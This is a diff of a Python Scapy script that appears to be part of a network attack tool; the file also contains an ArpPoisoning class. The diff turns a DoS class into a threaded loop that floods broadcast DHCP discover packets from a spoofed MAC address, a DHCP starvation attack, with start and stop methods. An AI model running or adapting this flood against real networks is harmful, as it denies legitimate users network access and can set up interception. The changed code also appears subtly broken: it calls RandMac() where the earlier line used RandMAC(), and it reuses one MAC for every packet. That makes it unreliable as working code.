@@ -139,12 +139,29 @@ class ArpPoisoning:
 
 
 class DoS:
-    def __init__(self):
-        conf.checkIPaddr = False
+    def __init__(self, iface):
+        self.__thread = None
+        self.iface = iface
+        self.is_running = False
 
-    def start(self):
-        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) \
+    def Dos_attack(self):
+        random_mac = RandMac()
+        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=random_mac) \
                         /IP(src="0.0.0.0", dst="255.255.255.255") \
                         /UDP(sport=68, dport=67) \
-                        /BOOTP(op=1, chaddr=RandMAC()) \
+                        /BOOTP(op=1, chaddr=random_mac) \
                         /DHCP(options=[("message-type", "discover"), ("end")])
+        while self.is_running:
+            sendp(dhcp_discover, iface=self.iface, verbose=False)
+
+    def start(self):
+        self.is_running = True
+        conf.checkIPaddr = False
+        self.__thread = threading.Thread(target=self.Dos_attack)
+        self.__thread.start()
+    
+    def stop(self):
+        self.is_running = False
+        conf.checkIPaddr=True
+        if self.__thread is not None:
+            self.__thread.join()
